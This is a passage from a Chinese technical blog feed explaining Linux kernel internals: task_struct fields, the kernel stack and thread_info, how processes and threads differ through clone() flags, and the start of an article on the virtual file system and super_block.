title="4）进程内核栈"></a><strong>4）进程内核栈</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="built_in">stack</span>;</span><br></pre></td></tr></table></figure><p>进程在内核态运行时需要自己的堆栈信息，因此linux内核为每个进程都提供了一个内核栈kernel stack。用户态进程所使用的栈，是在进程虚拟内存线性地址空间中；而内核栈是当进程从用户空间进入内核空间时，特权级发生变化，需要切换堆栈，那么内核空间中使用的就是这个内核栈。因为内核很少的栈空间，所以通常只需分配两页（8192字节）的空间。</p><p>下图中左边是一个thread_union结构体，它包含两部分，一部分是内核栈stack，第二部分是一个thread_info结构体。而在thread_info结构体里有一个指针指向该进程的task_struct结构体，反过来，task_struct里同样有一个指针<code>void *stack</code>指向这个thread_union结构体（也可以说指向该stack起始地址）。</p><p><img src="https://s2.loli.net/2023/08/17/u6EMeH4BGkJAaQr.png" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// thread_union 结构体</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">thread_union</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> <span class="title">thread_info</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="built_in">stack</span>[THREAD_SIZE/<span class="keyword">sizeof</span>(<span class="type">long</span>)];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// thread_info结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pcb_struct</span><span class="title">pcb</span>;</span><span class="comment">/* palcode state */</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>*<span class="title">task</span>;</span><span class="comment">/* main task structure */</span>  </span><br><span class="line">    <span class="comment">/*这里很重要，task指针指向的是所创建的进程的struct task_struct */</span></span><br><span class="line">    </span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>flags;<span class="comment">/* low level flags */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>ieee_state;<span class="comment">/* see fpu.h */</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exec_domain</span>*<span class="title">exec_domain</span>;</span><span class="comment">/* execution domain */</span>  <span class="comment">/*表了当前进程是属于哪一种规范的可执行程序,</span></span><br><span class="line"><span class="comment">                                         不同的系统产生的可执行文件的差异存放在变量exec_domain中 */</span></span><br><span class="line"><span class="type">mm_segment_t</span>addr_limit;<span class="comment">/* thread address space */</span></span><br><span class="line"><span class="type">unsigned</span>cpu;<span class="comment">/* current CPU */</span></span><br><span class="line"><span class="type">int</span>preempt_count; <span class="comment">/* 0 =&gt; preemptable, &lt;0 =&gt; BUG */</span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> bpt_nsaved;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> bpt_addr[<span class="number">2</span>];<span class="comment">/* breakpoint handling  */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> bpt_insn[<span class="number">2</span>];</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">restart_block</span><span class="title">restart_block</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>那么thread_info到底有什么用呢？其实这个结构体保存了task_struct中需要频繁和快速访问的字段，内核态在运行时可以迅速查到这些重要字段。此外，task_struct保存的是所有体系架构中通用的进程描述信息，而thread_info里却保存了特定体系结构汇编代码段需要访问的那部分进程的数据，因此，x86，arm等不同体系结构的thread_info并不完全相同。</p><h4 id="5）三个非常重要的结构体"><a href="#5）三个非常重要的结构体" class="headerlink" title="5）三个非常重要的结构体"></a><strong>5）三个非常重要的结构体</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>, *<span class="title">active_mm</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> *<span class="title">files</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fs_struct</span> *<span class="title">fs</span>;</span> </span><br></pre></td></tr></table></figure><p>这几个结构体相当重要，mm_struct用于描述进程的虚拟内存，files_struct描述进程打开的文件，fs_struct描述进程当前所在路径，这些结构体在我之前的几篇文章里有很详细的讲解，不了解的话可以去看看，这里呢就不再重复写了。</p><h4 id="6）调度信息"><a href="#6）调度信息" class="headerlink" title="6）调度信息"></a><strong>6）调度信息</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> prio, static_prio, normal_prio;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> rt_priority;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">sched_class</span> *<span class="title">sched_class</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sched_entity</span> <span class="title">se</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sched_rt_entity</span> <span class="title">rt</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> policy;</span><br></pre></td></tr></table></figure><p>实时优先级范围是0到MAX_RT_PRIO-1（即99），而普通进程的静态优先级范围是从MAX_RT_PRIO到MAX_PRIO-1（即100到139），值越大静态优先级越低。</p><p>static_prio用于保存静态优先级，可以通过nice系统调用来进行修改。prio用于保存动态优先级。rt_priority用于保存实时优先级。normal_prio 的值取决于静态优先级和调度策略(进程的调度策略有：先来先服务，短作业优先、时间片轮转、高响应比优先等等的调度算法)。</p><p>policy表示进程的调度策略。</p><h4 id="7）运行统计"><a href="#7）运行统计" class="headerlink" title="7）运行统计"></a><strong>7）运行统计</strong></h4><p>运行统计从宏观来说也是一种状态变量，但是和任务状态不同，其存储的主要是运行时间相关的成员变量，具体如下所示</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">u64        utime;<span class="comment">//用户态消耗的CPU时间</span></span><br><span class="line">u64        stime;<span class="comment">//内核态消耗的CPU时间</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>      nvcsw;<span class="comment">//自愿(voluntary)上下文切换计数</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>      nivcsw;<span class="comment">//非自愿(involuntary)上下文切换计数</span></span><br><span class="line">u64        start_time;<span class="comment">//进程启动时间，不包含睡眠时间</span></span><br><span class="line">u64        real_start_time;<span class="comment">//进程启动时间，包含睡眠时间</span></span><br></pre></td></tr></table></figure><h4 id="8）进程信号信息"><a href="#8）进程信号信息" class="headerlink" title="8）进程信号信息"></a><strong>8）进程信号信息</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">signal_struct</span> *<span class="title">signal</span>;</span><span class="comment">//指向进程信号描述符</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sighand_struct</span> *<span class="title">sighand</span>;</span><span class="comment">//指向进程信号处理程序描述符</span></span><br><span class="line"><span class="type">sigset_t</span> blocked, real_blocked;<span class="comment">//阻塞信号的掩码</span></span><br><span class="line"><span class="type">sigset_t</span> saved_sigmask;    <span class="comment">/* restored if set_restore_sigmask() was used */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigpending</span> <span class="title">pending</span>;</span><span class="comment">//进程上还需要处理的信号</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> sas_ss_sp;<span class="comment">//信号处理程序备用堆栈的地址</span></span><br><span class="line"><span class="type">size_t</span> sas_ss_size;<span class="comment">//信号处理程序的堆栈的地址</span></span><br></pre></td></tr></table></figure><h4 id="9）进程权限"><a href="#9）进程权限" class="headerlink" title="9）进程权限"></a><strong>9）进程权限</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">signal_struct</span> *<span class="title">signal</span>;</span><span class="comment">//指向进程信号描述符</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sighand_struct</span> *<span class="title">sighand</span>;</span><span class="comment">//指向进程信号处理程序描述符</span></span><br><span class="line"><span class="type">sigset_t</span> blocked, real_blocked;<span class="comment">//阻塞信号的掩码</span></span><br><span class="line"><span class="type">sigset_t</span> saved_sigmask;    <span class="comment">/* restored if set_restore_sigmask() was used */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigpending</span> <span class="title">pending</span>;</span><span class="comment">//进程上还需要处理的信号</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> sas_ss_sp;<span class="comment">//信号处理程序备用堆栈的地址</span></span><br><span class="line"><span class="type">size_t</span> sas_ss_size;<span class="comment">//信号处理程序的堆栈的地址</span></span><br></pre></td></tr></table></figure><p>以上就是一个task_struct结构体最常见的一些字段了，最重要的几个其实就是任务ID，亲缘关系，任务状态，内存管理以及文件系统管理，下面这幅图很好地总结了它的基本结构。</p><p><img src="https://s2.loli.net/2023/08/17/B8uMgLCsJV6oITY.png" alt="image.png"></p><h2 id="进程和线程的区别"><a href="#进程和线程的区别" class="headerlink" title="进程和线程的区别"></a>进程和线程的区别</h2><p>这是一个很经典的问题，同时也是面试操作系统中最最常被问到的问题，这部分包含了一些我自己的理解，如有不完善的地方欢迎和我一起聊聊。首先，我们先来看看面经是如何回答的：</p><blockquote><ol><li>进程是资源分配的基本单位，线程是程序执行和资源调度的基本单位。</li><li>进程有自己的独立地址空间，每启动一个进程，系统就会为它分配地址空间，建立数据表来维护代码段、堆栈段和数据段，这种操作非常昂贵。而线程是共享进程中的数据段，因此CPU切换一个线程的花费远比进程要小很多，同时创建一个线程的开销也比进程要小很多。</li><li>线程之间的通信更方便，同一进程下的线程共享全局变量、静态变量等数据，而进程之间的通信需要以通信的方式（IPC)进行。</li><li>多进程程序更健壮，多线程程序只要有一个线程死掉，整个进程也死掉了，而一个进程死掉并不会对另外一个进程造成影响。</li></ol></blockquote><p>通过前文我们了解到，从内核数据结构来看，一个PCB，即一个task_struct，也就是cpu调度的一个最基本单位。<strong>所以在Linux中我们通常所认为的进程和线程，在操作系统底层并没有什么区别，它们都是由task_struct结构体去表示的。</strong>当我们谈论到进程和线程的区别的时候，首先需要想到这幅图，也就是进程的虚拟地址空间：<img src="https://s2.loli.net/2023/08/17/Rue9f8s3CaXwpY4.png" alt="image.png"></p><p>简单起见，我们可以这样理解：我们把这样一整个虚拟地址空间看作一个集装箱，箱子里有各个模块（用户栈，数据段，代码段，堆等等），那么一个箱子就代表一个进程。如果新创建一个进程，就相当于新创建了一个箱子；而如果新建一个线程，仅仅是相当于在原来这个箱子里面的用户栈区域那里新创建了一个线程栈，新线程和原线程共享箱子里的mmap区，数据段，代码段等等资源，而独享自己的线程栈。那么结合前面的知识就可以很容易发现，一个task_struct<strong>并不是</strong>代表一个进程，而是代表一个线程。换句话说，<strong>一个进程包含多个线程，也就可以类比为：一个箱子里可能有多个task_struct，只不过同一个箱子里的多个task_struct共享数据段，mmap等资源，而独享自己的线程栈资源。也可以认为：线程栈的数量等于task_struct的个数。</strong>而如果是单线程程序，那么就只有一个线程栈，也就只有一个task_struct。</p><blockquote><p>一个线程栈其实是很小的，32位系统下，一整个进程虚拟空间有4GB大小，1GB的内核空间和3GB的用户空间，而通常默认一个线程栈只有8MB。也因此在不手动修改默认线程栈大小的情况下，32位Linux系统下通常一个进程最多也就可以创建300个左右的线程。</p></blockquote><p>从源码的角度看（参考Linux2.6），创建一个进程的函数是fork()，创建一个线程的函数是pthread_create()，值得注意的是，这两个函数底层都会调用同一个系统调用 clone()，而clone()函数正是会创建一个task_struct结构体，我们来看一看clone()函数的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">clone</span><span class="params">(<span class="type">int</span> (*fn)(<span class="type">void</span> *), <span class="type">void</span> *child_stack, <span class="type">int</span> flags, <span class="type">void</span> *arg)</span>;   </span><br></pre></td></tr></table></figure><p>其中我们需要尤其重点关注flags参数，flags是要复制资源的标志，描述你需要从父进程继承哪些资源，在这里设置参数：</p><table><thead><tr><th>Flags字段</th><th>解释</th></tr></thead><tbody><tr><td>CLONE_VM</td><td>子进程与父进程运行于相同的内存空间</td></tr><tr><td>CLONE_FS</td><td>子进程与父进程共享相同的文件系统，包括root、当前目录、umask</td></tr><tr><td>CLONE_FILES</td><td>子进程与父进程共享相同的文件描述符（file descriptor）表</td></tr><tr><td>CLONE_SIGHAND</td><td>子进程与父进程共享相同的信号处理（signal handler）表</td></tr><tr><td>……</td><td>……</td></tr></tbody></table><p>很简单的道理，创建新进程的fork()和创建新线程pthread_create()通过给clone()函数传递不同的参数值，决定了新建的那个task_struct究竟是新建一整个箱子，还是在原来的箱子里仅仅新建一个线程栈。</p><p>比如，对于fork()调用clone()，新建一个进程，也就意味着它新建的所有资源都应该自己独有，Linux的设计实际上是在创建task_struct时会拷贝父进程的资源。例如，一旦fork()出了一个新进程，那么相当于新进程会申请一些物理页，并填充其task_struct里对应的mm_struct，fs_struct，file_struct，signal等等字段，这些字段初始化时都会拷贝父进程的。</p><blockquote><p>当然，在这里有一个很重要的技术叫做<strong>写时复制（COW，copy on write）</strong>，也就是说 ，新建的进程虽然逻辑上是新建了一个箱子，自己独享自己的资源，但是刚创建时，这些资源在物理页实际上还是指向父进程的（其实就是浅拷贝），而一旦父进程或子进程在后续运行过程中有修改该字段，才会触发写时复制机制，系统才会给子进程新申请一块物理内存，此时子进程才真正意义上在该字段与父进程完全隔离。这个技术很大程度上避免了一些只读的数据重复拷贝造成时间和空间上的浪费。</p></blockquote><p>而pthread_create()调用clone()新建的子线程，则不会有自己独享的mm_struct，fs_struct，file_struct，signal等结构，例如子线程在修改file_struct时并不会触发写时拷贝给自己申请新物理页，而是与主线程共享这个字段，大家都能修改它，这也体现了它们处于同一个箱子里，共享这些资源的特征。</p><p>❓ 讲到这里大家可能会有一个神奇的想法：既然fork()调用clone()是mm_struct，fs_struct，file_struct，signal等字段都新创建并独自享有，pthread_create()调用clone()是mm_struct，fs_struct，file_struct，signal等字段都共享父线程。那么我可不可以自己直接调用clone()函数，通过传参设定mm_struct，fs_struct独自享有，file_struct，signal共享呢，那我这样创建出来的这个task_struct算是线程还是进程呢？</p><p>🤣 实际上这种想法很有意思，如果能够这样想或许你大概就真正理解进程和线程的区别了，借Linux大师宋宝华老师的一句话：这样，你就创建出了一个人妖。它既不是一个新进程，又不是一个新线程，它是一个人妖。因此其实我们也可以看到Linux确实是很灵活的。无论如何，Linux调度器才不管你是进程还是线程，还是人妖，反正它调度只认task_struct结构体。</p><hr><p>讲到这里，就有一个非常非常重要的结论了，我认为：线程是一个具体的概念，一个线程对应一个线程栈，也对应一个task_struct，一个进程可以包含一个或者多个线程。而进程实际上是一个抽象的概念，比如如果一个程序包含5个线程，那么这5个task_struct以及它们的资源组成的这么一个箱子的整体，那就是一个进程，<strong>而进程本身在Linux系统里并没有具体的结构体去描述它</strong>，因此我认为<strong>进程实际上就是一系列pid相同的线程的集合</strong>。换句话说，<strong>线程是一个物理上的具象（因为它由task_struct所描述），而进程是一个逻辑上的集合。</strong></p><blockquote><p><strong>进程实际上就是一系列pid相同的线程的集合。</strong></p></blockquote><p>此外，我们时常有听到主线程和子线程的概念，其实讲到这里我们就明白，从task_struct的角度看，所谓的主线程和子线程其实并没有任何主次之分，因为无论是在资源享有，线程调度等各个方面，所谓的主线程也都并没有比子线程 “高人一等”。可能唯一的一点特殊性就在于：所谓的主线程的pid等于整个进程的tgid吧（PS：这一点我其实不确定，待考究）。<strong>因此从内核这个意义上来看，我们可以抛弃主线程子线程这一概念，因为所有的线程都是平等的。</strong></p><p>那么有同学可能会有疑问，在下面这个例子里，为什么main退出之后其他子线程也会退出，而某一子线程运行结束之后其他子线程以及main主线程不会退出呢，这难道不是意味着main主线程比三个子线程更牛吗？<img src="https://s2.loli.net/2023/08/17/tApyiRqgTONhM6S.png" alt="image.png"></p><p>实际上关键问题出在<code>return</code>这个语句上。我们都知道一个进程包含的所有线程是共享堆，mmap，数据段等资源的，因此一旦某一个线程出了问题，为安全起见，Linux会杀掉该线程所在的进程包含的所有子线程。</p><blockquote><p>当然严格来说，线程崩溃其实是触发了SIGSEGV (Segmentation Violation&#x2F;Fault)信号。如果没有手动设置对应的Signal Handler操作那么系统就会自动终止整个进程（或者说默认的Signal Handler就是终止整个进程）；如果有手动设置，也可以恢复进程状态继续跑。</p></blockquote><p>此外，Linux还提供一个系统调用：exit()，它的作用是<strong>关闭所有文件，终止正在执行的进程。</strong>请注意，是终止正在执行的进程而不仅仅是终止该线程本身。在上图中，子线程里return实际上会返回到它的主调函数，也就是main函数里，因此这里创建的几个子线程在结束后并没有唤起终止整个进程。但是main里的<code>return 0;</code>实际上是直接返回操作系统并调用exit()系统调用，进而终止整个进程！这也就是为什么会出现 “main退出之后其他子线程也会退出，而某一子线程运行结束之后其他子线程以及main主线程不会退出” 这样的现象。</p><p>其实我们可以做这样一个实验：在main最后加一个<code>while(1);</code> 死循环让其不要退出，而在子线程里直接调用exit()系统调用，我们会发现：一旦子线程调用了exit()，包括main线程在内的所有线程依然会全部退出！这也进一步证明了：Linux里可以认为没有所谓的主线程和子线程之分，大家人人平等！</p><p>回到面经，我们可以看到，线程之间的通信更方便，同一进程下的线程共享全局变量等数据，但是某一线程崩溃却可能造成整个进程崩溃。而进程有自己的独立地址空间，因此多进程更加健壮，不过进程之间的通信就更麻烦，需要以进程间通信(IPC)的方式进行，例如：管道，消息队列，共享内存，套接字等等；</p><p>最后，我还想总结一句话，进程和线程，这两个概念，到底什么时候能够做区分呢？如果单独把一个task_struct拿出来问：它是一个进程还是一个线程？显然，我们是无法回答的。因此，实际上只有在clone()函数创建出一个新task_struct的那一瞬间，我们可以说：<strong>相比于父task_struct，我们新建了一个进程还是新建了一个线程</strong>，如果去掉参考系，去判断单独的一个task_struct是进程还是线程，可能并没有太大意义。</p><p>题外话，上述我们谈的都是内核级的线程，除此之外还有一种用户级线程，那是从应用层去自己实现了不同函数及调度等等操作，而在内核层面也只有一个task_struct，这我们就不过多阐述了。</p><p>到这里再来回看面经里的第一句话：<strong>进程是资源分配的基本单位，线程是资源调度的基本单位。</strong>我认为这句话总结的其实相当完美，它很好地概括了进程和线程的区别。最后，再提一下本篇文章的总结，那就是：</p><blockquote><p><strong>线程是一个物理上的具象（task_struct），进程是一个逻辑上的集合（资源封装的箱子）。</strong></p></blockquote><hr><p>以上就是对进程和线程的一些理解了，稍后我们将跟踪fork()和pthread_create()的源码，以及进入到clone()里，去进一步了解一下task_struct究竟是如何被创建的，这将更加有利于我们加深对其的理解。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Operating System </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux文件系统技术内幕</title>
      <link href="/2023/01/16/O03_Linux_fileSystem/"/>
      <url>/2023/01/16/O03_Linux_fileSystem/</url>
      
        <content type="html"><![CDATA[<blockquote><p> 学习 Linux 分析与应用的过程中可以自己尝试去实现一个文件系统，这个在我们的下一章节中进行代码操作。在这一章节我们一起来看看 Linux 文件系统中涉及到的各种结构体基础知识，为后面进一步手动操作做好铺垫。这部分内容在当初学操作系统时学校其实是讲的比较浅的，再加上各个结构体之间错杂交互，下面我们就来一起再探讨一下吧！参考书籍：Linux 内核设计与实现；深入理解 Linux 内核。</p></blockquote><h1 id="虚拟文件系统"><a href="#虚拟文件系统" class="headerlink" title="虚拟文件系统"></a>虚拟文件系统</h1><p>​一切皆文件是 Linux 的基本哲学之一，无论是普通文件还是目录，设备，套接字等都统一抽象成文件描述，并提供相同的 api 对其进行操作，正因此，Linux 中允许不同的文件系统共存，如 ext2，ext3，xfs等，而作为用户却无需关心底层文件类型，只需要使用统一的 api 便可进行各种文件操作，这就是 Linux 的虚拟文件系统（VFS，Virtual Filesystem Switch）。VFS 向上提供统一的文件操作接口（例如 open() 函数），而向下各个文件系统内部对其调用有各自的实现。什么是文件系统呢？其定义为操作系统中的各类文件，管理文件的软件，以及管理文件所涉及到的数据结构等信息的集合，他们都可挂载在 Linux 文件树下，即一个文件系统的顶层目录（&#x2F;）可挂载在另一个文件系统的子目录下，使之成为其树形结构的一个分支，而该子目录便称为挂载点。</p><p><img src="https://s2.loli.net/2023/01/16/6gsIBJFflynKU2c.jpg" alt="WAS42F8324_4_B_HGGDRADR.jpg"></p><p>​Linux 下有几十种文件类型，如下。</p><ul><li>ext2 具有极快的速度和极小的CPU占用率，可用于硬盘和移动存储设备，兼容 FAT，安全性不高。</li><li>ext3 增加日志功能，可回溯追踪，稳定性高。</li><li>ext4 日志式文件系统，支持1EB，最大单文件16TB，支持连续写入可减少文件碎片。</li><li>xfs 可以管理500T的硬盘。rhel7 默认文件系统。</li></ul><p>​windows 的文件系统有比如 FAT16，FAT32，NTFS等等，还有其他文件系统比如 RAMFS：内存文件系统；ISO 9660：光盘；NFS：网络文件系统等。比如我们 Linux 的<code>/proc</code>目录就是一种 procfs虚拟文件系统，其挂载于 Linux 根目录下。接下来我们就来看看构成文件系统的数据结构，也就是文件系统在磁盘中的表现形式。</p><h1 id="文件在磁盘中的组织形式"><a href="#文件在磁盘中的组织形式" class="headerlink" title="文件在磁盘中的组织形式"></a>文件在磁盘中的组织形式</h1><p>​磁盘是由若干扇区组成，每个扇区有512B (将磁盘存储区扇区化是为了更好的管理磁盘)。若干个扇区可组成一个块 (ext2 默认是由8个扇区组成一个块，即 4kb ，这里为了简化说明，就把2个扇区组成一个块，即 1kb)。而若干个块便组成了磁盘的一个分区。</p><p>​文件系统的物理表现形式主要由四个部分组成。<strong>超级块，索引节点，目录块，数据块</strong>。除此之外还有每个分区开头的<strong>自举块</strong>（主要存储分区本身的操作系统类型、分区起始地址，与文件系统无关，每个分区只有一个），位于 i节点表 和 超级块 之间的（下图没画出来）的**块组描述表 GDT <strong>（存储一个块组的描述配置信息），</strong>块位图(block bitmap)<strong>（每个比特位表示一个数据块是否被标记使用；1：已使用，0：未使用；）以及</strong>inode 位图(inode bitmap)**（每一个比特位表示一个inode节点。1：已使用，0：未使用；）。</p><p><img src="https://s2.loli.net/2023/01/16/1Wr3GIyiVBNQ2H9.png" alt="image.png"></p><h2 id="超级块-super-block"><a href="#超级块-super-block" class="headerlink" title="超级块(super block)"></a>超级块(super block)</h2><p>​⽤于存储⽂件系统的全局控制信息的数据结构，是文件系统的心脏，一个超级块对应一个独立的文件系统。描述⽂件系统的状态、⽂件系统类型、大小 、区块数、索引节点数等，存放于磁盘的特定扇区中。当操作系统启动后，系统内核会把超级块中的内容复制到内存中，并周期性的利用内存里的最新内容去更新硬盘上的超级块中的内容（超级块对象维护着整个文件系统的元数据，因此在开机后是常驻内存并被缓存的）。而对于某些非基于磁盘的文件系统（例如基于内存的文件系统，sysfs），它们会在使用现场创建超级块并保存于内存之中。</p><p>​由于这个更新存在时间差，为此内存中的超级块信息与硬盘中的超级块信息往往只有在开机与关机的某个特定时刻是同步的，而在其他时间都是不同步的。假设当操作系统意外宕机或者断电时，内存中的超级块信息没有及时保存到硬盘中，此时文件系统的完整性就会受到破坏。到这种情况时，系统工程师往往需要利用系统提供的 sync 命令在系统出现故障的那一刻把内存里的内容复制到磁盘上。这个过程往往操作系统会自动完成，这也正是因为为什么Unix操作系统要比Windows操作系统稳定的一个重要原因。当操作系统重新启动的过程中，系统内核会对两者进行比较，根据他们之间的差异，给文件系统打上干净或者脏的标签，该信息也是存储在文件系统的超级块中。</p><p>​通过<code>df -i</code>命令可以查看目前在 Linux 系统上的文件系统磁盘使用情况（inode，后面有介绍）统计。接着使用<code>sudo dumpe2fs /xxxx</code>可以查看该文件系统的超级块和块组信息。</p><p>​超级块对象由 super_block 结构体表示，定义于 <code>linux/fs.h</code>中，如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">s_list</span>;</span></span><br><span class="line"><span class="type">dev_t</span>s_dev;<span class="comment">/*设备标识符 */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>s_blocksize;<span class="comment">/*以字节为单位的块大小*/</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>s_blocksize_bits;<span class="comment">/*块大小占用位数，如512字节的位数为9*/</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>s_dirt;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>s_maxbytes;<span class="comment">/* Max file size */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_system_type</span>*<span class="title">s_type</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">super_operations</span>*<span class="title">s_op</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">dquot_operations</span>*<span class="title">dq_op</span>;</span><span class="comment">/*文件系统的配额操作函数集合*/</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">quotactl_ops</span>*<span class="title">s_qcop</span>;</span><span class="comment">/*文件系统的配额控制操作函数集合*/</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">export_operations</span> *<span class="title">s_export_op</span>;</span><span class="comment">/*网络文件系统的导出操作函数集合*/</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>s_flags;<span class="comment">/*挂载标志*/</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>s_magic;<span class="comment">/*魔术数标记*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span>*<span class="title">s_root</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span><span class="title">s_umount</span>;</span><span class="comment">/*文件系统卸载时候用到的读写信号量*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span><span class="title">s_lock</span>;</span><span class="comment">/*专用的互斥量*/</span></span><br><span class="line"><span class="type">int</span>s_count; <span class="comment">/*引用计数*/</span></span><br><span class="line"><span class="type">int</span>s_syncing;<span class="comment">/*文件系统的同步标记位*/</span></span><br><span class="line"><span class="type">int</span>s_need_sync_fs;<span class="comment">/*需要同步的标记位*/</span></span><br><span class="line"><span class="type">atomic_t</span>s_active;<span class="comment">/*原子文件系统引用计数*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> 